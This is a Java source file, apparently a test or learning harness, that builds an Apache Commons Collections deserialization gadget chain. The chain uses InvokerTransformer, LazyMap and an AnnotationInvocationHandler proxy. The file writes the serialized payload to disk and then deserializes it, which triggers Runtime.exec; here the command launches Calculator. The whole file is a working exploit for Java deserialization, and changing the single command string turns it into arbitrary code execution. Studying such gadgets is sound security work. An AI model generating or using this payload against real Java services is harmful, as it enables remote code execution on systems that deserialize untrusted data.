
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;


import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class LazyMapAIHTest {
    private static Object createPayload() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),

                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),

                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),

                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"open /Applications/Calculator.app"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = org.apache.commons.collections.map.LazyMap.decorate(innerMap, transformerChain);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
        Map map = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(),lazyMap.getClass().getInterfaces(),invocationHandler);
        Object instance = constructor.newInstance(Override.class, map);
        return instance;
    }

    private static void createPayloadFile(Object object, String file)
            throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File(file)));
        objectOutputStream.writeObject(object);
        objectOutputStream.flush();
        objectOutputStream.close();
    }

    private static void payloadTest(String file) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(file));
        Object o = objectInputStream.readObject();
        System.out.println(o);
        objectInputStream.close();
    }

    public static void main(String[] args) throws Exception {
        createPayloadFile(createPayload(),"payload");
        payloadTest("payload");
    }
}
